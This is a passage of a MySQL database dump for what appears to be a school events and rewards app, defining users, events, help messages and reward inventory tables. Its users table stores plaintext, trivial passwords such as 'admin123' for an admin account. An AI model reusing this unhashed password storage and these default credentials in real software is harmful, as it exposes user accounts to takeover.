  `program` varchar(100) DEFAULT NULL,
  `major` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `phone`, `role`, `points`, `name`, `department`, `program`, `major`) VALUES
(1, 'admin_01', 'admin123', NULL, 'admin', 0, 'Jane Admin', 'CICS', NULL, NULL),
(2, 'student_01', 'pass123', NULL, 'student', 120, 'John Student', 'CICS', 'BSIT', 'Service Management');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `eventparticipants`
--
ALTER TABLE `eventparticipants`
  ADD PRIMARY KEY (`eventID`,`id`),
  ADD KEY `id` (`id`);

--
-- Indexes for table `event_registrations`
--
ALTER TABLE `event_registrations`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `studentID` (`studentID`,`eventID`);

--
-- Indexes for table `help_conversations`
--
ALTER TABLE `help_conversations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `help_messages`
--
ALTER TABLE `help_messages`
  ADD PRIMARY KEY (`id`),
  ADD KEY `conversation_id` (`conversation_id`);

--
-- Indexes for table `rewards`
--
ALTER TABLE `rewards`
  ADD PRIMARY KEY (`rewardID`);

--
-- Indexes for table `schoolevents`
--
ALTER TABLE `schoolevents`
  ADD PRIMARY KEY (`eventID`);

--
-- Indexes for table `student_activity_log`
--
ALTER TABLE `student_activity_log`
  ADD PRIMARY KEY (`logID`);

--
-- Indexes for table `student_inventory`
--
ALTER TABLE `student_inventory`
  ADD PRIMARY KEY (`inventoryID`),
  ADD KEY `studentID` (`studentID`),
  ADD KEY `rewardID` (`rewardID`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `event_registrations`
--
ALTER TABLE `event_registrations`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=82;

--
-- AUTO_INCREMENT for table `help_conversations`
--
ALTER TABLE `help_conversations`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=58;

--
-- AUTO_INCREMENT for table `help_messages`
--
ALTER TABLE `help_messages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=161;

--
-- AUTO_INCREMENT for table `rewards`
--
ALTER TABLE `rewards`
  MODIFY `rewardID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT for table `schoolevents`
--
ALTER TABLE `schoolevents`
  MODIFY `eventID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;

--
-- AUTO_INCREMENT for table `student_activity_log`
--
ALTER TABLE `student_activity_log`
  MODIFY `logID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT for table `student_inventory`
--
ALTER TABLE `student_inventory`
  MODIFY `inventoryID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=99;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `eventparticipants`
--
ALTER TABLE `eventparticipants`
  ADD CONSTRAINT `eventparticipants_ibfk_1` FOREIGN KEY (`eventID`) REFERENCES `schoolevents` (`eventID`);

--
-- Constraints for table `help_messages`
--
ALTER TABLE `help_messages`
  ADD CONSTRAINT `help_messages_ibfk_1` FOREIGN KEY (`conversation_id`) REFERENCES `help_conversations` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `student_inventory`
--
ALTER TABLE `student_inventory`
  ADD CONSTRAINT `student_inventory_ibfk_2` FOREIGN KEY (`rewardID`) REFERENCES `rewards` (`rewardID`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
